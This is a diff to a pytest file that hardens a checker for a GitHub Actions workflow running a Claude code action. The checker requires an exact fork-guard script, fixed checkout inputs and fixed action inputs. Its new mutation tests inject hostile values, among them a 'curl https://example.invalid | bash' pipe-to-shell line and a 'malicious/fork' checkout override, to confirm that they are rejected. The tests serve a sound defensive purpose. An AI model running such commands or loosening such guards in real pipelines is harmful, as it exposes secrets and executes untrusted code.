@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import copy
 import hashlib
+import shlex
 from pathlib import Path
 
 import pytest
@@ -390,6 +391,13 @@ def _split_top(expr: str, op: str) -> list[str]:
     return parts
 
 
+def _strip_parens(expr: str) -> str:
+    expr = expr.strip()
+    while expr.startswith("(") and _closing_paren(expr, 0) == len(expr) - 1:
+        expr = expr[1:-1].strip()
+    return expr
+
+
 def _closing_paren(expr: str, open_at: int) -> int:
     depth, quote = 0, None
     for i in range(open_at, len(expr)):
@@ -412,7 +420,7 @@ def _claude_gate_violations(condition: str) -> list[str]:
     problems: list[str] = []
     seen: list[str] = []
     for branch in _split_top(" ".join(condition.split()), "||"):
-        terms = _split_top(branch, "&&")
+        terms = [_strip_parens(term) for term in _split_top(branch, "&&")]
         events = [
             event for event in CLAUDE_GATE_FIELDS
             if f"github.event_name == '{event}'" in terms
@@ -475,29 +483,47 @@ def _claude_violations(text: str) -> list[str]:
         "fork_guard", CLAUDE_CHECKOUT, CLAUDE_ACTION,
     ]:
         problems.append("steps")
-    for step in steps:
-        if "continue-on-error" in step:
-            problems.append(f"{step.get('id') or step.get('uses')}: continue-on-error")
-        if "run" in step and step.get("id") != "fork_guard":
-            problems.append(f"{step.get('uses')}: run")
-        # A step condition such as `if: always()` after the guard would run
-        # the privileged steps even when the fork guard failed.
-        if "if" in step and step.get("id") != "fork_guard":
-            problems.append(f"{step.get('uses')}: step condition")
+    if set(workflow) != {"name", "on", "jobs"}:
+        problems.append("workflow keys")
+    expected_keys = [
+        {"name", "id", "if", "env", "run"}, {"uses", "with"}, {"uses", "with"},
+    ]
+    for index, step in enumerate(steps):
+        if index >= len(expected_keys) or set(step) != expected_keys[index]:
+            problems.append(f"step {index}: keys")
     guard = steps[0] if steps else {}
-    # The guard must run for every PR-bound event and fail on a fork.
-    if (
-        guard.get("if") != "github.event.issue.pull_request || github.event.pull_request"
-        or "isCrossRepository" not in guard.get("run", "")
-        or 'if [ "$cross" != "false" ]' not in guard.get("run", "")
-        or "exit 1" not in guard.get("run", "")
-    ):
-        problems.append("fork guard")
+    if guard.get("if") != "github.event.issue.pull_request || github.event.pull_request":
+        problems.append("fork guard condition")
+    if guard.get("env") != {
+        "GH_TOKEN": "${{ github.token }}",
+        "PR": "${{ github.event.issue.number || github.event.pull_request.number }}",
+    }:
+        problems.append("fork guard environment")
+    # Compare the complete bounded control flow, ignoring shell layout and comments.
+    # Presence of an API call and exit is insufficient: overrides/early exits
+    # can otherwise turn a fail-closed lookup into permission to execute fork code.
+    expected_guard = '''
+        cross=$(gh pr view "$PR" -R "$GITHUB_REPOSITORY" --json isCrossRepository -q .isCrossRepository)
+        if [ "$cross" != "false" ]; then
+            echo "Refusing @claude on a pull request from a fork." >&2
+            exit 1
+        fi
+    '''
+    def shell_tokens(script: str) -> list[str]:
+        lexer = shlex.shlex(script, posix=False, punctuation_chars=True)
+        lexer.whitespace_split = True
+        return list(lexer)
+    if shell_tokens(guard.get("run", "")) != shell_tokens(expected_guard):
+        problems.append("fork guard control flow")
+    checkout = steps[1] if len(steps) > 1 else {}
+    if checkout.get("with") != {"fetch-depth": "1"}:
+        problems.append("checkout inputs")
     inputs = (steps[-1].get("with") or {}) if steps else {}
-    if set(inputs) - {"claude_code_oauth_token", "additional_permissions"}:
-        problems.append(f"action inputs: {sorted(inputs)}")
-    if inputs.get("claude_code_oauth_token") != "${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}":
-        problems.append("token source")
+    if inputs != {
+        "claude_code_oauth_token": "${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}",
+        "additional_permissions": "actions: read\n",
+    }:
+        problems.append("action inputs")
     return problems
 
 
@@ -618,3 +644,34 @@ def test_claude_gate_rejects_count_preserving_unguarded_branch():
     )
     assert mutated.count(CLAUDE_TRUSTED) == text.count(CLAUDE_TRUSTED)
     assert _claude_violations(mutated)
+
+
+@pytest.mark.parametrize("prefix", ["exit 0\n", "cross=false\n", "curl https://example.invalid | bash\n"])
+def test_claude_guard_rejects_control_flow_override(prefix: str):
+    text = CLAUDE.read_text(encoding="utf-8")
+    workflow = _load(text)
+    guard = workflow["jobs"]["claude"]["steps"][0]
+    guard["run"] = guard["run"].replace('if [ "$cross"', prefix + 'if [ "$cross"', 1)
+    assert _claude_violations(yaml.safe_dump(workflow))
+
+
+@pytest.mark.parametrize("inputs", [
+    {"repository": "malicious/fork", "ref": "main"},
+    {"ref": "refs/pull/1/head"},
+])
+def test_claude_checkout_rejects_untrusted_override(inputs: dict):
+    workflow = _load(CLAUDE.read_text(encoding="utf-8"))
+    workflow["jobs"]["claude"]["steps"][1]["with"].update(inputs)
+    assert _claude_violations(yaml.safe_dump(workflow))
+
+
+def test_claude_gate_equivalent_wrappers_stay_green():
+    workflow = _load(CLAUDE.read_text(encoding="utf-8"))
+    job = workflow["jobs"]["claude"]
+    job["if"] = job["if"].replace(
+        "github.event_name == 'issue_comment'", "((github.event_name == 'issue_comment'))",
+    ).replace(
+        "contains(github.event.review.body, '@claude')",
+        "(contains(github.event.review.body, '@claude'))",
+    )
+    assert _claude_violations(yaml.safe_dump(workflow)) == []
